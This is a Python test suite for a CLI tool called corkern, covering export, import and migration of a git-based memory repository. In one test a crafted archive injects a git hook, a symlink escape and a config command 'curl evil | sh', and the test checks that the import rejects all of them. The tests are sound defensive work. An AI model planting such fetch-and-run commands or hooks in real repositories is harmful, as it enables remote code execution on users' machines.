"""corkern export / import, migrate from a corkern export, and the knowledge-repo format marker."""
import hashlib
import io
import json
import os
import shutil
import stat
import subprocess
import tarfile
from pathlib import Path

import pytest
from typer.testing import CliRunner

from corkern.main import app
from tests.test_hooks import ROOT, hook, world  # noqa: F401  (fixture)

V1_WORK = Path.home() / "dev" / "corkern-v1-work"


def run(*args, stdin=""):
    return CliRunner().invoke(app, list(args), input=stdin)


def git(repo, *args):
    return subprocess.run(["git", "-C", str(repo), *args], capture_output=True, text=True).stdout.strip()


@pytest.fixture
def kr(tmp_path, monkeypatch):
    repo = tmp_path / "kr"
    assert run("init", str(repo)).exit_code == 0
    for k, v in {"CORKERN_MEMORY_DIR": str(repo), "HOME": str(tmp_path / "home"),
                 "XDG_STATE_HOME": str(tmp_path / "st"), "CORKERN_DEVICE_NAME": "laptop"}.items():
        monkeypatch.setenv(k, v)
    (tmp_path / "home").mkdir()
    (repo / "memory" / "web").mkdir(parents=True)
    (repo / "memory" / "web" / "MEMORY.md").write_text("- [a](a.md)\n")
    (repo / "memory" / "web" / "a.md").write_text("fact a\n")
    (repo / "memory" / "web" / "b.md").write_text("fact b\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "memories")
    (repo / "memory" / "web" / "pending.md").write_text("not committed yet\n")
    return repo


def export_to(path):
    r = run("export", "--out", str(path))
    assert r.exit_code == 0, r.output
    return r


def craft(src: Path, dst: Path, add: dict[str, bytes] | None = None, manifest_patch: dict | None = None):
    with tarfile.open(src) as a:
        files = {m.name: a.extractfile(m).read() for m in a}
    man = json.loads(files.pop("manifest.json"))
    files.update(add or {})
    man.update(manifest_patch or {})
    man["files"] = [{"path": n, "kind": "x", "size": len(d), "sha256": hashlib.sha256(d).hexdigest()}
                    for n, d in files.items()]
    with tarfile.open(dst, "w:gz") as b:
        for n, d in [("manifest.json", json.dumps(man).encode()), *files.items()]:
            info = tarfile.TarInfo(n)
            info.size = len(d)
            b.addfile(info, io.BytesIO(d))


def test_export_is_private_verified_and_complete(kr, tmp_path):
    out = tmp_path / "x.tar.gz"
    r = export_to(out)
    assert "verified and written" in r.output and "1 not yet committed change(s) included" in r.output
    assert stat.S_IMODE(out.stat().st_mode) == 0o600
    with tarfile.open(out) as t:
        names = t.getnames()
        man = json.loads(t.extractfile("manifest.json").read())
    assert man["format"] == "corkern-export" and man["format_version"] == 1 and man["tool"] == "corkern v2"
    assert "data/memory/web/pending.md" in names and "data/corkern.conf" in names
    assert man["knowledge_repo_format"] == 1
    assert not any(n.startswith("data/.git/") for n in names)


def test_round_trip_restores_without_overwriting(kr, tmp_path):
    out = tmp_path / "x.tar.gz"
    export_to(out)
    assert "0 imported" not in run("import", str(out), "--check").output
    check = run("import", str(out), "--check").output
    assert "identical" in check and "missing here" not in check and "nothing was changed" in check
    (kr / "memory" / "web" / "a.md").unlink()
    (kr / "memory" / "web" / "MEMORY.md").write_text("- [mine](mine.md)\n")
    (kr / "memory" / "web" / "b.md").write_text("changed here\n")
    r = run("import", str(out), "--apply", "--yes")
    assert r.exit_code == 0, r.output
    assert (kr / "memory" / "web" / "a.md").read_text() == "fact a\n"                       # restored
    index = (kr / "memory" / "web" / "MEMORY.md").read_text()
    assert "- [mine](mine.md)" in index and "- [a](a.md)" in index                         # combined
    assert (kr / "memory" / "web" / "b.md").read_text() == "changed here\n"                # mine kept
    assert list((kr / "memory" / "web").glob("b.from-export-laptop-*.md"))                 # theirs next to it
    again = run("import", str(out), "--check").output
    assert "missing here" not in again


def test_interactive_default_keeps_mine(kr, tmp_path):
    out = tmp_path / "x.tar.gz"
    export_to(out)
    (kr / "memory" / "web" / "b.md").write_text("changed here\n")
    r = run("import", str(out), "--apply", stdin="\n\n")
    assert (kr / "memory" / "web" / "b.md").read_text() == "changed here\n"
    assert not list((kr / "memory" / "web").glob("b.from-export-*")) and "1 kept as they were" in r.output


def test_damaged_and_newer_exports_are_refused(kr, tmp_path):
    out = tmp_path / "x.tar.gz"
    export_to(out)
    with tarfile.open(out) as a:
        files = {m.name: a.extractfile(m).read() for m in a}
    files["data/memory/web/a.md"] = b"tampered\n"
    bad = tmp_path / "bad.tar.gz"
    with tarfile.open(bad, "w:gz") as b:
        for n, d in files.items():
            i = tarfile.TarInfo(n)
            i.size = len(d)
            b.addfile(i, io.BytesIO(d))
    r = run("import", str(bad), "--apply", "--yes")
    assert r.exit_code == 1 and "checksum mismatch" in r.output and "Nothing was changed" in r.output
    newer = tmp_path / "newer.tar.gz"
    craft(out, newer, manifest_patch={"format_version": 9})
    r = run("import", str(newer), "--check")
    assert r.exit_code == 1 and "newer than this corkern understands" in r.output


def test_crafted_entries_are_never_written(kr, tmp_path):
    out = tmp_path / "x.tar.gz"
    export_to(out)
    evil = tmp_path / "evil.tar.gz"
    outside = tmp_path / "outside"
    outside.mkdir()
    (kr / "memory" / "linked").symlink_to(outside)
    craft(out, evil, {"data/.git/hooks/post-commit": b"#!/bin/sh\necho pwned\n",
                      "data/hooks/x.sh": b"echo pwned\n",
                      "data/memory/linked/x.md": b"through the symlink\n",
                      "data/.iwe/config.toml": b'[commands.default]\nrun = "curl evil | sh"\n'})
    r = run("import", str(evil), "--apply", "--yes")
    assert r.exit_code == 0, r.output
    assert not (kr / ".git" / "hooks" / "post-commit").exists() and not (kr / "hooks").exists()
    assert not (outside / "x.md").exists()
    assert not (kr / ".iwe" / "config.toml").exists()
    assert "never imported" in r.output and "never with --yes" in r.output


def _v1_export(tmp_path) -> Path:
    """A v1-format export as v1's `corkern export` writes it (built from the format spec)."""
    files = {"data/projects.conf": b"web:dev/web\nnewproj:dev/newproj\n",
             "data/memory/web/MEMORY.md": b"- [a](a.md)\n- [v1](v1.md)\n",
             "data/memory/web/a.md": b"fact a\n", "data/memory/web/v1.md": b"from v1\n",
             "data/global/CLAUDE.md": b"# Global\n", "data/.devices/host-b": b"host:host-b\n",
             "local/projects.local.conf": b"web:/mnt/c/web\n",
             "claude/settings.json": b'{"hooks": {}}', "claude/links.tsv": b""}
    man = {"format": "corkern-export", "format_version": 1, "tool": "corkern v1", "host": "host-b",
           "created": "2026-10-06T10:00:00+02:00",
           "repo": {"path": "/home/userb/dev/corkern", "uncommitted": ["memory/web/v1.md"]},
           "files": [{"path": n, "kind": "x", "size": len(d), "sha256": hashlib.sha256(d).hexdigest()}
                     for n, d in files.items()]}
    out = tmp_path / "v1.tar.gz"
    with tarfile.open(out, "w:gz") as b:
        for n, d in [("manifest.json", json.dumps(man).encode()), *files.items()]:
            i = tarfile.TarInfo(n)
            i.size = len(d)
            b.addfile(i, io.BytesIO(d))
    return out


def test_migrate_from_a_v1_export_then_verify(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    src = _v1_export(tmp_path)
    dest = tmp_path / "new-kr"
    r = run("migrate", str(src), str(dest))
    assert r.exit_code == 0, r.output
    assert "corkern v1 export from host-b" in r.output and "1 change(s) that were not committed" in r.output
    assert "newproj:dev/newproj" in (dest / "corkern.conf").read_text()
    assert (dest / "memory" / "web" / "v1.md").read_text() == "from v1\n"
    assert (dest / ".corkern-format").read_text().strip() == "knowledge_repo_format=1"
    assert not (dest / "corkern.conf.local").exists()                 # host-b's own paths stay out
    monkeypatch.setenv("CORKERN_MEMORY_DIR", str(dest))
    check = run("import", str(src), "--check").output
    assert "missing here" not in check and "different here" not in check
    assert "Claude Code wiring from host-b" in check and "corkern init-device" in check


def test_v1_export_brings_missing_projects_and_files(kr, tmp_path):
    src = _v1_export(tmp_path)
    r = run("import", str(src), "--apply", "--yes")
    assert r.exit_code == 0, r.output
    conf = (kr / "corkern.conf").read_text()
    assert "newproj:dev/newproj" in conf
    assert (kr / "memory" / "web" / "v1.md").read_text() == "from v1\n"
    assert "- [v1](v1.md)" in (kr / "memory" / "web" / "MEMORY.md").read_text()


def test_newer_knowledge_repo_format_is_refused(kr):
    (kr / ".corkern-format").write_text("knowledge_repo_format=9\n")
    r = run("status")
    assert r.exit_code != 0 and "Update corkern" in r.output


def test_hooks_refuse_a_newer_format(world):
    (world["a"] / ".corkern-format").write_text("knowledge_repo_format=9\n")
    (world["a"] / "memory" / "x").mkdir(parents=True)
    (world["a"] / "memory" / "x" / "n.md").write_text("n\n")
    hook("corkern-commit-memory", world["a"], world["tmp"])
    assert "memory/x/n.md" not in git(world["a"], "ls-files")
    note = (world["tmp"] / "state" / "corkern" / "last-hook-problem").read_text()
    assert "newer than these hooks understand" in note


@pytest.mark.skipif(not (V1_WORK / "export-import.py").exists(), reason="v1 work clone not present")
def test_real_v1_exporter_round_trips_through_v2(tmp_path, monkeypatch):
    v1 = tmp_path / "v1"
    shutil.copytree(V1_WORK, v1, ignore=shutil.ignore_patterns(".git"))
    (v1 / "memory" / "home" / "uncommitted.md").write_text("u\n")
    home = tmp_path / "home"
    home.mkdir()
    env = {**os.environ, "HOME": str(home)}
    out = tmp_path / "real-v1.tar.gz"
    r = subprocess.run(["python3", str(v1 / "export-import.py"), "export", "--repo", str(v1), "--out", str(out)],
                       capture_output=True, text=True, env=env)
    assert r.returncode == 0, r.stdout + r.stderr
    monkeypatch.setenv("HOME", str(home))
    dest = tmp_path / "kr"
    assert run("migrate", str(out), str(dest)).exit_code == 0
    monkeypatch.setenv("CORKERN_MEMORY_DIR", str(dest))
    check = run("import", str(out), "--check").output
    assert "missing here" not in check and "different here" not in check, check


def test_missing_only_leaves_differences_alone(kr, tmp_path):
    out = tmp_path / "x.tar.gz"
    export_to(out)
    (kr / "memory" / "web" / "a.md").unlink()
    (kr / "memory" / "web" / "b.md").write_text("changed here\n")
    r = run("import", str(out), "--apply", "--yes", "--missing-only")
    assert r.exit_code == 0, r.output
    assert (kr / "memory" / "web" / "a.md").exists()
    assert not list((kr / "memory" / "web").glob("b.from-export-*")) and "left as they are" in r.output


def test_migrate_refuses_conflict_markers(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    v1 = tmp_path / "v1"
    (v1 / "memory" / "web").mkdir(parents=True)
    (v1 / "memory" / "web" / "a.md").write_text("a\n")
    (v1 / "projects.conf").write_text("web:dev/web\n<<<<<<< Updated upstream\nwiki:/x\n=======\nv2:dev/v2\n>>>>>>> Stashed changes\n")
    bundle = tmp_path / "b.tar"
    subprocess.run(["tar", "-cf", str(bundle), "-C", str(v1), "memory", "projects.conf"], check=True)
    r = run("migrate", str(bundle), str(tmp_path / "kr"))
    assert r.exit_code == 1 and "conflict markers in corkern.conf" in r.output
    assert not (tmp_path / "kr").exists()


def test_migrate_refuses_conflict_markers_in_any_memory(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    v1 = tmp_path / "v1"
    (v1 / "memory" / "web").mkdir(parents=True)
    (v1 / "memory" / "web" / "notes.md").write_text("<<<<<<< ours\na\n=======\nb\n>>>>>>> theirs\n")
    (v1 / "memory" / "web" / "blob.bin").write_bytes(b"\0\n<<<<<<< binary, not a conflict\n")
    (v1 / "projects.conf").write_text("web:dev/web\n")
    bundle = tmp_path / "b.tar"
    subprocess.run(["tar", "-cf", str(bundle), "-C", str(v1), "memory", "projects.conf"], check=True)
    r = run("migrate", str(bundle), str(tmp_path / "kr"))
    assert r.exit_code == 1 and "conflict markers in memory/web/notes.md" in r.output
    assert "blob.bin" not in r.output
    assert not (tmp_path / "kr").exists()
